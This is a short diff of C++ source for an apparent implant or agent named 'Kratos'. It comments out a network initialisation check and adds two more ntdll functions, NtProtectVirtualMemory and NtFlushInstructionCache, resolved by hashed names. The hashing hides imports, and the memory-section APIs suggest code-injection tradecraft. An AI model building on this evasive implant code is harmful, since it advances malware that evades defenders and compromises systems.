@@ -5,8 +5,8 @@
 
 BOOL Kratos::Init() {
 
-	this->modules.kernel32 = api::GetModule( HASH_STRW ( L"KERNEL32.DLL" ) );
-	auto pLocalAlloc = ( decltype ( this->apis.LocalAlloc ) ) api::GetProcAddress( this->modules.kernel32, HASH_STRA ( "LocalAlloc" ) );
+	this->dlls.kernel32 = api::GetModule( HASH_STRW ( L"KERNEL32.DLL" ) );
+	auto pLocalAlloc = ( decltype ( this->apis.LocalAlloc ) ) api::GetProcAddress( this->dlls.kernel32, HASH_STRA ( "LocalAlloc" ) );
 	if (!pLocalAlloc)
 		return FALSE;
 
@@ -31,10 +31,10 @@ BOOL Kratos::Init() {
 		DEBUG_LOG("[!] Failed loading config");
 		return FALSE;
 	}
-	if ( ! net->init( ) ) {
-		DEBUG_LOG("[!] Failed network init");
-		return FALSE;
-	}
+	// if ( ! net->init( ) ) {
+	// 	DEBUG_LOG("[!] Failed network init");
+	// 	return FALSE;
+	// }
 	if( ! this->Register( ) ) {
 		DEBUG_LOG("[!] Failed register");
 		return FALSE;
@@ -80,6 +80,8 @@ BOOL Kratos::LoadApis( ) {
 		this->apis.NtQueryInformationProcess = ( decltype ( this->apis.NtQueryInformationProcess ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtQueryInformationProcess" ) );
 		this->apis.NtCreateSection           = ( decltype ( this->apis.NtCreateSection           ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtCreateSection"           ) );
 		this->apis.NtMapViewOfSection        = ( decltype ( this->apis.NtMapViewOfSection        ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtMapViewOfSection"        ) );
+		this->apis.NtProtectVirtualMemory    = ( decltype ( this->apis.NtProtectVirtualMemory    ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtProtectVirtualMemory"    ) );
+		this->apis.NtFlushInstructionCache   = ( decltype ( this ->apis.NtFlushInstructionCache  ) )api::GetProcAddress( this->dlls.ntdll, HASH_STRA( "NtFlushInstructionCache"   ) );
 	}
 	else { return FALSE; }
 
